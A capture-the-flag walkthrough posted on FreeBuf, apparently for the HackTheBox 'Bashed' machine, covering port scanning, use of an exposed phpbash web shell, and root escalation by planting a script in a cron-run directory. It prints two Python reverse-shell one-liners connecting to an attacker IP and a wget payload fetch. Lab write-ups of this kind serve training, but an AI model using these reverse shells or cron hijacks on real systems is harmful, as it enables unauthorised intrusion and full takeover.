---
title: [Meachines] [Easy] Bashed PHP Bash+Python计划任务权限提升
url: https://www.freebuf.com/articles/web/420843.html
source: FreeBuf网络安全行业门户
date: 2025-01-27
fetch_date: 2025-10-06T20:08:25.166113
---

# [Meachines] [Easy] Bashed PHP Bash+Python计划任务权限提升

[![freeBuf](/images/logoMax.png)](/)

主站

分类

云安全

AI安全

开发安全

终端安全

数据安全

Web安全

基础安全

企业安全

关基安全

移动安全

系统安全

其他安全

特色

热点

工具

漏洞

人物志

活动

安全招聘

攻防演练

政策法规

[报告](https://www.freebuf.com/report)[专辑](/column)

* ···
* [公开课](https://live.freebuf.com)
* ···
* [商城](https://shop.freebuf.com)
* ···
* 用户服务
* ···

行业服务

政 府

CNCERT
CNNVD

会员体系（甲方）
会员体系（厂商）
产品名录
企业空间

[知识大陆](https://wiki.freebuf.com/page)

搜索

![](/freebuf/img/7aa3bf7.svg) ![](/freebuf/img/181d733.svg)

创作中心

[登录](https://www.freebuf.com/oauth)[注册](https://www.freebuf.com/oauth)

官方公众号企业安全新浪微博

![](/images/gzh_code.jpg)

FreeBuf.COM网络安全行业门户，每日发布专业的安全资讯、技术剖析。

![FreeBuf+小程序](/images/xcx-code.jpg)

FreeBuf+小程序把安全装进口袋

[![](https://image.3001.net/images/20231020/1697804527_653270ef7570cc7356ba8.png)](https://wiki.freebuf.com)

[Meachines] [Easy] Bashed PHP Bash+Python计划任务权限提升

* ![]()
* 关注

* [Web安全](https://www.freebuf.com/articles/web)

[Meachines] [Easy] Bashed PHP Bash+Python计划任务权限提升

2025-01-26 15:58:15

所属地 福建省

![](https://image.3001.net/images/20240308/1709876354_65eaa4828e91d155430d9.png)
本文由
创作，已纳入「FreeBuf原创奖励计划」，未授权禁止转载

# Information Gathering

| IP Address | Opening Ports |
| --- | --- |
| 10.10.10.68 | **TCP**:80 |

`$ sudo masscan -p1-65535,U:1-65535 10.10.10.68 --rate=1000 -p1-65535,U:1-65535 -e tun0 > /tmp/ports`
`$ ports=$(cat /tmp/ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')`
`$ nmap -Pn -sV -sC -p$ports 10.10.10.68`

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site
```

# PHP Bash

![image-1.png](https://image.3001.net/images/20250126/1737878184_6795eaa8536036343f3e8.png!small)

`$ dirsearch -u http://10.10.10.68`

![image.png](https://image.3001.net/images/20250126/1737878187_6795eaab8fb32f47c2583.png!small)

`http://10.10.10.68/dev/`

![image-3.png](https://image.3001.net/images/20250126/1737878190_6795eaaeaa87ce0a3f942.png!small)

`http://10.10.10.68/dev/phpbash.php`

![image-2.png](https://image.3001.net/images/20250126/1737878193_6795eab1a6158559ccd04.png!small)

`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.16",445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'`

## User.txt

> 8f7df2f47989e214ab11a888ee378946

# www-data to scriptmanager

`$ sudo -l`

`$ sudo -u scriptmanager ./reverse.sh`

![image-4.png](https://image.3001.net/images/20250126/1737878200_6795eab877a2a9cd75768.png!small)

# Privilege Escalation : Python cron jobs

`$ ./pspy32`

![image-5.png](https://image.3001.net/images/20250126/1737878222_6795eace8bb576c91e0f5.png!small)

`$ cd /scripts;touch 1.py`

![image-6.png](https://image.3001.net/images/20250126/1737878230_6795ead60b88111f847bf.png!small)

```
import os,pty,socket;s=socket.socket();s.connect(("10.10.16.16",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")
```

`$ wget http://10.10.16.16/reverse.py`

![image-7.png](https://image.3001.net/images/20250126/1737878235_6795eadb26c8c63a5278c.png!small)

## Root.txt

> 96c6dadfc0c09eb783c4d2e614205ef9

# CTF

免责声明

1.一般免责声明：本文所提供的技术信息仅供参考，不构成任何专业建议。读者应根据自身情况谨慎使用且应遵守《中华人民共和国网络安全法》，作者及发布平台不对因使用本文信息而导致的任何直接或间接责任或损失负责。

2. 适用性声明：文中技术内容可能不适用于所有情况或系统，在实际应用前请充分测试和评估。若因使用不当造成的任何问题，相关方不承担责任。

3. 更新声明：技术发展迅速，文章内容可能存在滞后性。读者需自行判断信息的时效性，因依据过时内容产生的后果，作者及发布平台不承担责任。

![]()

![](https://image.3001.net/images/20240308/1709876354_65eaa4828e91d155430d9.png)
已在FreeBuf发表 0 篇文章

本文为 独立观点，未经授权禁止转载。
如需授权、对文章有疑问或需删除稿件，请联系 FreeBuf
客服小蜜蜂（微信：freebee1024）

被以下专辑收录，发现更多精彩内容

+ 收入我的专辑

+ 加入我的收藏

展开更多

相关推荐

![]()

关 注

* 0 文章数
* 0 关注者

文章目录

User.txt

Root.txt

![](/images/logo_b.png)

本站由阿里云 提供计算与安全服务

### 用户服务

* [有奖投稿](https://www.freebuf.com/write)
* [提交漏洞](https://www.vulbox.com/bounties/detail-72)
* [参与众测](https://www.vulbox.com/projects/list)
* [商城](https://shop.freebuf.com)

### 企业服务

* [安全咨询](https://company.freebuf.com)
* [产业全景图](https://www.freebuf.com/news/307349.html)
* [企业SRC](https://www.vulbox.com/service/src)
* [安全众测](https://www.vulbox.com/)

### 合作信息

* [斗象官网](https://www.tophant.com/)
* [广告投放](https://www.freebuf.com/articles/444331.html)
* [联系我们](https://www.freebuf.com/articles/444332.html)

### 关于我们

* [关于我们](https://www.freebuf.com/news/others/864.html)
* 微信公众号
* [新浪微博](http://weibo.com/freebuf)

### 战略伙伴

* [![](https://image.3001.net/images/20191017/1571306518_5da83c1686dd9.png)](http://www.aliyun.com/?freebuf)

### FreeBuf知识大陆

![](https://image.3001.net/images/20250703/1751535036_68664dbcae34ac40bb9e7.png)

扫码把安全装进口袋

* [斗象科技](https://www.tophant.com/)
* [FreeBuf](https://www.freebuf.com)
* [漏洞盒子](https://www.vulbox.com/)
* [斗象智能安全](https://ai.tophant.com/)
* [免责条款](https://www.freebuf.com/dis)
* [协议条款](https://my.freebuf.com/AgreeProtocol/duty)

Copyright © 2025 WWW.FREEBUF.COM All Rights Reserved
[沪ICP备2024099014号](https://beian.miit.gov.cn/#/Integrated/index) | [沪公安网备
![](https://image.3001.net/images/20200106/1578291342_5e12d08ec2379.png)](http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=31011502009321)